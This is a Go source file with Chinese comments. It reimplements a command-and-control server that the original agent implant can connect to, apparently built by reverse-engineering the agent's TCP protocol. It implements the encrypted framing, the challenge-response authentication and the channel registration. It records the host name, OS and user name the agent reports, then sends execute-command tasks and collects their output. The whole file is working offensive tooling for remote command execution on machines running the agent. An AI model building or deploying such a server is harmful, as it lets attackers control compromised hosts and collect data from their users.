package c2engine

// 官方（原版）tcp 传输的服务端实现 —— 让**官方 agent 载荷**能连上复刻端。
//
// 协议全部来自 R19–R23 的实测（见 docs/RE-NOTES.md E-33…E-37）：
//
//	帧      ：[u32 LE 长度][12B nonce][AES-256-GCM 密文][16B tag]
//	密钥    ：hex(md5(salt))（32 字节 ASCII；salt 为空 → d41d8cd9…）
//	记录    ：[u32 LE 长度] + 文本/JSON
//	认证    ：agent 发两条 "4.9.3" → 服务端发 md5("4.9.3") → agent 回 md5(vkey)
//	         → 服务端回 "sucs"
//	通道注册：认证后 agent 发 "conf" / "main" / "chan"
//	          conf：服务端回 \x01 → agent 发 "conf \x01\x00\x00{client json}"
//	                → 服务端回 \x01 + 16 字节会话 ID
//	任务    ：服务端 06|chan → agent 01|chan → 服务端 03|chan|len → [len]{task json}
//	结果    ：agent 03|chan|len → [len] payload，形如 "->|<输出>|<-"
//
// 设计要点：
//   - 官方 agent 会同时开多条连接（conf/main/chan），每条连接独立跑一遍认证；
//   - 实测存在"收到挑战不回、5 秒后重连"的竞态，因此服务端**按连接独立状态机**
//     且允许随时重连，不做全局串行假设；
//   - 任务下发只对已注册的 main 通道生效（与抓包一致）。

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"
)

// OfficialVersion 是官方 agent 上报并用于挑战的版本号。
const OfficialVersion = "4.9.3"

// 认证用到的固定应答串。
const (
	officialAuthOK      = "sucs"
	officialChannelConf = "conf"
	officialChannelMain = "main"
	officialChannelChan = "chan"
)

// 记录/通道帧类型字节（实测）。
const (
	officialMsgAck       = 0x06 // 服务端确认
	officialMsgData      = 0x03 // 数据
	officialMsgProgress  = 0x05 // 进度
	officialMsgClientAck = 0x01 // 客户端确认
	officialMsgDone      = 0x07 // 结束
)

// OfficialTCPServer 是官方 tcp 传输的服务端。
type OfficialTCPServer struct {
	mu       sync.Mutex
	addr     string
	vkey     string
	salt     string
	listener net.Listener
	conns    []*officialConn
	main     *officialConn // 已注册 main 通道的连接
	// ReadTimeout 是单条记录的读超时（默认 60s；测试可调小）。
	ReadTimeout time.Duration
	// AuthExtras 为 true 时在认证通过后追加 ack + 会话 ID（实验开关）。
	AuthExtras bool
	// AuthDelay 是校验 md5(vkey) 之后、回 "sucs" 之前的等待（实测真实服务端约 300ms）。
	// 该延迟只用于第一条（conf）连接。
	AuthDelay time.Duration
	// confDone 记录是否已有 conf 通道完成上报（后续连接不再延迟）。
	confDone bool
	client   map[string]interface{}
	results  chan string
	closed   bool
	Logf     func(format string, args ...interface{})
}

// officialConn 是一条连接的状态机。
type officialConn struct {
	srv       *OfficialTCPServer
	conn      net.Conn
	rd        *bufio.Reader
	wmu       sync.Mutex
	state     string // ver / chal / auth / conf / done / main / chan
	awaitBody bool   // 收到 03 头记录后，下一条记录是数据体
	verN      int
	name      string // conf / main / chan
}

// NewOfficialTCPServer 创建服务端（addr 形如 "127.0.0.1:18650"）。
func NewOfficialTCPServer(addr, vkey, salt string) *OfficialTCPServer {
	return &OfficialTCPServer{
		addr:        addr,
		vkey:        vkey,
		salt:        salt,
		client:      map[string]interface{}{},
		results:     make(chan string, 32),
		Logf:        Logf,
		ReadTimeout: 60 * time.Second,
		AuthDelay:   300 * time.Millisecond,
	}
}

// Start 开始监听。
func (s *OfficialTCPServer) Start() error {
	ln, err := net.Listen("tcp", s.addr)
	if err != nil {
		return err
	}
	s.mu.Lock()
	s.listener = ln
	s.mu.Unlock()
	s.Logf("official-tcp: listening on %s (vkey=%s)", s.addr, s.vkey)
	go s.acceptLoop(ln)
	return nil
}

// Stop 关闭监听与所有连接。
func (s *OfficialTCPServer) Stop() {
	s.mu.Lock()
	s.closed = true
	ln := s.listener
	conns := append([]*officialConn(nil), s.conns...)
	s.mu.Unlock()
	if ln != nil {
		_ = ln.Close()
	}
	for _, c := range conns {
		_ = c.conn.Close()
	}
}

// Results 返回结果通道（形如 "->|输出|<-" 的原文）。
func (s *OfficialTCPServer) Results() <-chan string { return s.results }

// ClientInfo 返回 agent 上报的 client 记录（conf 时的 JSON）。
func (s *OfficialTCPServer) ClientInfo() map[string]interface{} {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make(map[string]interface{}, len(s.client))
	for k, v := range s.client {
		out[k] = v
	}
	return out
}

func (s *OfficialTCPServer) acceptLoop(ln net.Listener) {
	for {
		c, err := ln.Accept()
		if err != nil {
			s.mu.Lock()
			closed := s.closed
			s.mu.Unlock()
			if closed {
				return
			}
			continue
		}
		oc := &officialConn{srv: s, conn: c, rd: bufio.NewReader(c), state: "ver"}
		s.Logf("official-tcp: conn from %s", c.RemoteAddr())
		s.mu.Lock()
		s.conns = append(s.conns, oc)
		s.mu.Unlock()
		go oc.serve()
	}
}

// serve 是单连接状态机。
func (c *officialConn) serve() {
	defer func() {
		_ = c.conn.Close()
		c.srv.mu.Lock()
		for i, x := range c.srv.conns {
			if x == c {
				c.srv.conns = append(c.srv.conns[:i], c.srv.conns[i+1:]...)
				break
			}
		}
		if c.srv.main == c {
			c.srv.main = nil
		}
		c.srv.mu.Unlock()
	}()

	for {
		timeout := c.srv.ReadTimeout
		if timeout <= 0 {
			timeout = 60 * time.Second
		}
		_ = c.conn.SetReadDeadline(time.Now().Add(timeout))
		plain, err := c.readRecord()
		if err != nil {
			c.srv.Logf("official-tcp: read end from %s: %v", c.conn.RemoteAddr(), err)
			return
		}
		c.srv.Logf("official-tcp: %s <- %q (state=%s)", c.conn.RemoteAddr(), truncateForLog(string(plain), 60), c.state)
		if err := c.handle(plain); err != nil {
			return
		}
	}
}

// readRecord 读一条完整记录（4 字节长度 + 帧体）并解密。
func (c *officialConn) readRecord() ([]byte, error) {
	var hdr [4]byte
	if _, err := io.ReadFull(c.rd, hdr[:]); err != nil {
		return nil, err
	}
	n := int(binary.LittleEndian.Uint32(hdr[:]))
	if n <= 0 || n > 1<<20 {
		return nil, fmt.Errorf("bad record length %d", n)
	}
	body := make([]byte, n)
	if _, err := io.ReadFull(c.rd, body); err != nil {
		return nil, err
	}
	return Unframe(body, c.srv.salt)
}

// send 发一条记录（加密）。
func (c *officialConn) send(plain []byte) error {
	c.wmu.Lock()
	defer c.wmu.Unlock()
	wire, err := FrameEncrypt(plain, c.srv.salt)
	if err != nil {
		return err
	}
	c.srv.Logf("official-tcp: -> %s %x", c.conn.RemoteAddr(), wire)
	_, err = c.conn.Write(wire)
	return err
}

// handle 按状态处理一条记录。
func (c *officialConn) handle(plain []byte) error {
	s := c.srv
	switch c.state {
	case "ver":
		// 官方 agent 会在同一连接连发两条版本记录
		if strings.Contains(string(plain), OfficialVersion) && len(plain) < 16 {
			c.verN++
			if c.verN >= 2 {
				// 实测：紧接着第二条版本记录立刻回挑战时，官方 agent 常常不回应；
				// 给一个很小的延迟（与 Python 原型一致的行为）可稳定通过。
				time.Sleep(30 * time.Millisecond)
				// 挑战 = md5(版本号)
				if err := c.send([]byte(OfficialAuthChallenge(OfficialVersion))); err != nil {
					s.Logf("official-tcp: send challenge failed: %v", err)
					return err
				}
				s.Logf("official-tcp: challenge sent to %s", c.conn.RemoteAddr())
				c.state = "chal"
			}
			return nil
		}
		return nil
	case "chal":
		// 期望 md5(vkey)
		want := OfficialAuthResponse(s.vkey)
		if strings.EqualFold(string(plain), want) {
			// 实测（R26）：真实服务端在收到 md5(vkey) 后约 270–370ms 才回 "sucs"。
			// R27 补充：延迟只对**第一条（conf）连接**需要；conf 完成后的后续连接
			// 立刻回 sucs，否则 agent 不会声明 main/chan。
			// R28：真实服务端在**每条连接**上都有 ~300ms 延迟（抓包：conf 连接 366ms、
			// main 连接 266ms），因此这里统一延迟，不做首连接特判。
			if d := s.AuthDelay; d > 0 {
				time.Sleep(d)
			}
			if err := c.send([]byte(officialAuthOK)); err != nil {
				s.Logf("official-tcp: send sucs failed: %v", err)
				return err
			}
			s.Logf("official-tcp: %s authenticated", c.conn.RemoteAddr())
			// 实验：认证后再补一条 ack + 会话 ID，观察是否能驱动 agent 注册 main
			if s.AuthExtras {
				_ = c.send([]byte{0x01})
				_ = c.send([]byte(officialSessionID()))
			}
			c.state = "auth"
			return nil
		}
		// 应答不符：断开（官方会重连）
		return errors.New("bad auth response")
	case "auth":
		switch string(plain) {
		case officialChannelConf:
			c.name = officialChannelConf
			if err := c.send([]byte{0x01}); err != nil {
				return err
			}
			c.state = "conf"
			return nil
		case officialChannelMain:
			c.name = officialChannelMain
			s.mu.Lock()
			s.main = c
			s.mu.Unlock()
			s.Logf("official-tcp: main channel registered from %s", c.conn.RemoteAddr())
			c.state = "main"
			return nil
		case officialChannelChan:
			c.name = officialChannelChan
			c.state = "chan"
			s.Logf("official-tcp: data channel registered from %s", c.conn.RemoteAddr())
			return nil
		}
		return nil
	case "conf":
		// "conf \x01\x00\x00{client json}"
		if strings.HasPrefix(string(plain), "conf ") {
			jsonPart := plain
			if i := strings.IndexByte(string(plain), '{'); i >= 0 {
				jsonPart = plain[i:]
			}
			var info map[string]interface{}
			if err := json.Unmarshal(jsonPart, &info); err == nil {
				s.mu.Lock()
				s.client = info
				s.mu.Unlock()
				s.Logf("official-tcp: client registered: host=%v os=%v user=%v",
					info["HostName"], info["OsName"], info["UserName"])
			}
			if err := c.send([]byte{0x01}); err != nil {
				return err
			}
			// 会话 ID（16 字节文本）
			if err := c.send([]byte(officialSessionID())); err != nil {
				return err
			}
			c.state = "done"
			s.mu.Lock()
			s.confDone = true
			s.mu.Unlock()
			return nil
		}
		return nil
	}

	// 已认证后的通用处理：通道注册（同一连接上后续仍可能发 main/chan）、心跳与结果
	switch string(plain) {
	case officialChannelMain:
		c.name = officialChannelMain
		s.mu.Lock()
		s.main = c
		s.mu.Unlock()
		s.Logf("official-tcp: main channel registered from %s", c.conn.RemoteAddr())
		return nil
	case officialChannelChan:
		c.name = officialChannelChan
		s.Logf("official-tcp: data channel registered from %s", c.conn.RemoteAddr())
		return nil
	}

	// 心跳与结果
	if len(plain) >= 7 && plain[0] == 0x00 {
		// 心跳：00 ff ff ff ff 1e 00 → 回 08 ff ff ff ff 1e 00
		resp := append([]byte{officialMsgAck}, plain[1:]...)
		return c.send(resp)
	}
	// 数据头：03|chan(4B)|len(2B) —— 数据体在**下一条记录**里（[u32 len][文本]）
	if len(plain) >= 5 && plain[0] == officialMsgData {
		c.awaitBody = true
		return nil
	}
	if c.awaitBody {
		c.awaitBody = false
		body := plain
		if len(body) >= 4 {
			if n := int(binary.LittleEndian.Uint32(body[:4])); n >= 0 && 4+n <= len(body) {
				body = body[4 : 4+n]
			}
		}
		text := string(body)
		if strings.HasPrefix(text, "->|") {
			select {
			case s.results <- text:
			default:
			}
			s.Logf("official-tcp: result: %s", truncateForLog(text, 200))
		}
	}
	return nil
}

// SendTask 向已注册的 main 通道下发一条官方格式任务，返回通道号。
func (s *OfficialTCPServer) SendTask(task *OfficialTask) (uint32, error) {
	s.mu.Lock()
	c := s.main
	s.mu.Unlock()
	if c == nil {
		return 0, errors.New("no main channel registered")
	}
	payload, err := task.Encode()
	if err != nil {
		return 0, err
	}
	const chanID uint32 = 1
	hdr := make([]byte, 9)
	hdr[0] = officialMsgData
	binary.LittleEndian.PutUint32(hdr[1:5], chanID)
	binary.LittleEndian.PutUint16(hdr[5:7], uint16(len(payload)))
	if err := c.send(hdr[:7]); err != nil {
		return 0, err
	}
	body := make([]byte, 4+len(payload))
	binary.LittleEndian.PutUint32(body[:4], uint32(len(payload)))
	copy(body[4:], payload)
	if err := c.send(body); err != nil {
		return 0, err
	}
	return chanID, nil
}

// RunCommand 下发一条 M 类型任务并等待结果（带超时）。
func (s *OfficialTCPServer) RunCommand(cmd string, timeout time.Duration) (string, error) {
	// main 通道通常在 conf 之后几秒才注册：先等它就绪再下发
	deadline := time.Now().Add(timeout)
	for {
		s.mu.Lock()
		ready := s.main != nil
		s.mu.Unlock()
		if ready {
			break
		}
		if time.Now().After(deadline) {
			return "", errors.New("timeout waiting for main channel")
		}
		time.Sleep(50 * time.Millisecond)
	}
	if _, err := s.SendTask(NewOfficialTask(OfficialTaskExec, cmd)); err != nil {
		return "", err
	}
	select {
	case r := <-s.results:
		return r, nil
	case <-time.After(time.Until(deadline)):
		return "", errors.New("timeout waiting for result")
	}
}

// officialSessionID 生成 16 字符会话 ID。
//
// 抓包里的形态是**大小写字母+数字**（如 FQ0022pIHROm5ibh），不是纯十六进制；
// 这里按同样字符集随机生成。
func officialSessionID() string {
	// 抓包里的会话 ID（如 FQ0022pIHROm5ibh）是 **12 字节随机数的 base64**（16 字符）；
	// 用普通字母数字串时 agent 收到后会直接关闭连接（R26 实测）。
	buf := make([]byte, 12)
	if _, err := rand.Read(buf); err != nil {
		for i := range buf {
			buf[i] = byte(time.Now().UnixNano() >> (uint(i%8) * 8))
		}
	}
	return base64.RawURLEncoding.EncodeToString(buf)
}

// truncateForLog 截断长文本用于日志。
func truncateForLog(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
